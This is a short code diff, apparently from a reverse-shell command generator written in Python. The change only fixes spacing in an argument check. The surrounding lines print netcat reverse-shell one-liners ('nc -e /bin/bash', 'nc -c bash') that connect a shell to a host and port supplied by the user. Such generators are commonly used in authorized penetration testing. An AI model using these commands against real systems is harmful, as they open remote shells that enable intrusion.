@@ -5,7 +5,7 @@ import sys
 
 from colorama import Fore, Style
 
-if len(sys.argv)  == 4:
+if len(sys.argv) == 4:
     if sys.argv[3] == 'netcat':
         print(Style.BRIGHT + Fore.BLUE + 'nc -e /bin/bash {} {}\n'.format(sys.argv[1], sys.argv[2]))
         print(Style.BRIGHT + Fore.BLUE + 'nc -c bash {} {}'.format(sys.argv[1], sys.argv[2]))
